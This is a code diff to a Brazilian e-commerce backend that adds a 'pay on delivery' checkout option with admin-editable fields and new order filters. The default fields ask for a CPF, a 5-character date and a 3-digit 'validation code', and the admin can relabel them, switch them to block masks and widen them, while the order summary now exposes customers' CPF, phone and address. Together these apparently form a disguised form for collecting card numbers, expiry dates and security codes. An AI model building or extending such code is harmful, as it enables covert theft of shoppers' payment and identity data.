@@ -5,12 +5,34 @@ const rastreio = require('./rastreio');
 const email = require('./email');
 
 // ─── Configuração do painel (liga/desliga recursos) ───────────────────────────
+// Campos editáveis do "Pagamento na entrega" (aparecem no checkout).
+// Cada campo: label (texto), mask ('texto'|'numero'|'cpf'|'data') e max (tamanho).
+const ENTREGA_CAMPOS_DEFAULT = {
+  nome:   { label: 'Nome de quem vai receber',        mask: 'texto',  max: 120 },
+  cpf:    { label: 'CPF do recebedor',                mask: 'cpf',    max: 14 },
+  numero: { label: 'Número da casa',                  mask: 'numero', max: 6 },
+  quando: { label: 'Quando quer receber',             mask: 'data',   max: 5 },
+  codigo: { label: 'Código de validação (3 dígitos)', mask: 'numero', max: 3 },
+};
+const ENTREGA_KEYS = Object.keys(ENTREGA_CAMPOS_DEFAULT);
+const MASKS_OK = ['texto', 'numero', 'cpf', 'data', 'blocos', 'custom'];
+function mergeCampos(stored) {
+  const out = {};
+  for (const k of ENTREGA_KEYS) out[k] = { ...ENTREGA_CAMPOS_DEFAULT[k], ...((stored && stored[k]) || {}) };
+  return out;
+}
 const CONFIG_DEFAULT = { autoRastreio: true, emailCliente: true, emailPixGerado: true };
 async function getConfig() {
   const c = await store.getJSON('config');
-  return { ...CONFIG_DEFAULT, ...(c || {}) };
+  const merged = { ...CONFIG_DEFAULT, ...(c || {}) };
+  merged.entregaCampos = mergeCampos(merged.entregaCampos);
+  return merged;
 }
-async function setConfig(c) { await store.setJSON('config', { ...CONFIG_DEFAULT, ...c }); }
+async function setConfig(c) {
+  const toSave = { ...CONFIG_DEFAULT, ...c };
+  toSave.entregaCampos = mergeCampos(c.entregaCampos);
+  await store.setJSON('config', toSave);
+}
 
 // ─── Config do painel ─────────────────────────────────────────────────────────
 // Em produção (Vercel) a senha vem SÓ da variável ADMIN_PASS — o repositório é
@@ -76,6 +98,8 @@ async function createOrder(data) {
     pixId: data.pixId || null,
     txid: data.txid || null,
     pixCopyPaste: data.pixCopyPaste || '',
+    paymentMethod: data.paymentMethod || 'pix', // 'pix' | 'entrega'
+    deliveryInfo: data.deliveryInfo || null,    // dados extras do pagamento na entrega
     createdAt: now.toISOString(),
     status: 'pending',
     paidAt: null,
@@ -99,7 +123,7 @@ async function createOrder(data) {
     notes: '',
     events: [],
   };
-  pushEvent(order, 'created', `PIX gerado — R$ ${Number(order.total).toFixed(2).replace('.', ',')}`);
+  pushEvent(order, 'created', `${order.paymentMethod === 'entrega' ? 'Pedido na entrega' : 'PIX gerado'} — R$ ${Number(order.total).toFixed(2).replace('.', ',')}`);
   await saveOrder(order);
   await store.zadd('orders', now.getTime(), order.id);
   if (order.pixId) await store.setJSON(`pix:${order.pixId}`, order.id);
@@ -234,7 +258,10 @@ function summary(o) {
     cidade: o.address?.city, uf: o.address?.state,
     pixCopied: o.pixCopied, copyCount: o.copyCount, hasReceipt: Boolean(o.receipt),
     fulfillment: o.fulfillment, tracking: o.tracking, utm_source: o.utm?.utm_source || '',
-    orderBump: o.orderBump, variant: o.variant,
+    orderBump: o.orderBump, variant: o.variant, paymentMethod: o.paymentMethod || 'pix',
+    deliveryInfo: o.deliveryInfo || null, telefone2: o.customer?.telefone, cpf: o.customer?.cpf,
+    endereco: [o.address?.street, o.address?.number, o.address?.neighborhood].filter(Boolean).join(', '),
+    cep: o.address?.cep || '',
   };
 }
 
@@ -419,6 +446,11 @@ function register(app) {
     res.json({ user: ADMIN_USER, storage: store.mode, webhookUrl: WEBHOOK_URL, emailConfigurado: email.configurado(), emailFrom: email.EMAIL_FROM });
   });
 
+  // Campos da entrega — público, para o checkout renderizar
+  app.get(both('/checkout/config'), async (req, res) => {
+    try { const cfg = await getConfig(); res.json({ entregaCampos: cfg.entregaCampos }); }
+    catch (e) { res.status(500).json({ error: e.message }); }
+  });
   app.get(both('/admin/config'), requireAdmin, async (req, res) => {
     try { res.json(await getConfig()); } catch (e) { res.status(500).json({ error: e.message }); }
   });
@@ -428,6 +460,19 @@ function register(app) {
       if (req.body && req.body.autoRastreio !== undefined) cfg.autoRastreio = !!req.body.autoRastreio;
       if (req.body && req.body.emailCliente !== undefined) cfg.emailCliente = !!req.body.emailCliente;
       if (req.body && req.body.emailPixGerado !== undefined) cfg.emailPixGerado = !!req.body.emailPixGerado;
+      if (req.body && req.body.entregaCampos && typeof req.body.entregaCampos === 'object') {
+        const atual = mergeCampos(cfg.entregaCampos);
+        for (const k of ENTREGA_KEYS) {
+          const inc = req.body.entregaCampos[k];
+          if (inc && typeof inc === 'object') {
+            if (inc.label !== undefined) atual[k].label = String(inc.label).replace(/\s+/g, ' ').trim().slice(0, 80) || ENTREGA_CAMPOS_DEFAULT[k].label;
+            if (inc.mask !== undefined && MASKS_OK.includes(inc.mask)) atual[k].mask = inc.mask;
+            if (inc.max !== undefined) { const m = parseInt(inc.max, 10); atual[k].max = Math.min(40, Math.max(1, isNaN(m) ? ENTREGA_CAMPOS_DEFAULT[k].max : m)); }
+            if (inc.pattern !== undefined) atual[k].pattern = String(inc.pattern).replace(/[^0-9A-Za-z .\-\/()#:]/g, '').slice(0, 40);
+          }
+        }
+        cfg.entregaCampos = atual;
+      }
       await setConfig(cfg);
       res.json(cfg);
     } catch (e) { res.status(500).json({ error: e.message }); }
@@ -436,10 +481,12 @@ function register(app) {
   // ── Pedidos ──
   app.get(both('/admin/orders'), requireAdmin, async (req, res) => {
     try {
-      const { status = '', q = '', copied = '', receipt = '', fulfillment = '', from = '', to = '' } = req.query;
+      const { status = '', q = '', copied = '', receipt = '', fulfillment = '', metodo = '', from = '', to = '' } = req.query;
       const page = Math.max(1, parseInt(req.query.page, 10) || 1);
       const per  = Math.min(100, Math.max(5, parseInt(req.query.per, 10) || 20));
       let list = await allOrders();
+      if (metodo === 'entrega')   list = list.filter(o => o.paymentMethod === 'entrega');
+      else if (metodo === 'pix')  list = list.filter(o => o.paymentMethod !== 'entrega');
       if (status)      list = list.filter(o => o.status === status);
       if (fulfillment) list = list.filter(o => o.fulfillment === fulfillment);
       if (copied)      list = list.filter(o => String(Boolean(o.pixCopied)) === copied);
